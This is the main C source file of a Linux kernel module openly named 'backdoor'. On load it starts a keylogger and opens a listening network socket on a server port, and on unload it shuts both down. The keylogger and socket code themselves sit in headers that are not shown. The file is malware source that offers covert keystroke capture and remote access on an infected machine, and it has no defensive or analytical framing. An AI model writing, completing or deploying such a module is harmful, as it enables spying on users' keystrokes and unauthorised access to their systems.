#include "keylogger.h"
#include "socket.h"
#include "snapshot.h"

// Create a socket
static int __init backdoor_init(void)
{
    int err;

    printk(KERN_DEBUG "backdoor: initializing backdoor module\n");
    err = keylogger_init();
    if (err)
    {
        printk(KERN_ERR "backdoor: error initializing keylogger\n");
        return err;
    }

    err = backdoor_socket_init(SERVER_PORT);
    if (err)
    {
        printk(KERN_ERR "backdoor: error initializing socket\n");
        keylogger_exit();
        return err;
    }

    printk(KERN_DEBUG "backdoor: initialization complete\n");
    return 0;
}

static void __exit backdoor_exit(void)
{
    printk(KERN_DEBUG "backdoor: exiting backdoor module\n");

    backdoor_socket_exit();
    keylogger_exit();

    printk(KERN_DEBUG "backdoor: exiting complete\n");
}

// set basic info about the module, important for modinfo and lsmod.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Heitor Tanoue de Mello");
MODULE_AUTHOR("Beatriz Cardoso de Oliveira");
MODULE_AUTHOR("Beatriz Aimee");

module_init(backdoor_init);
module_exit(backdoor_exit);
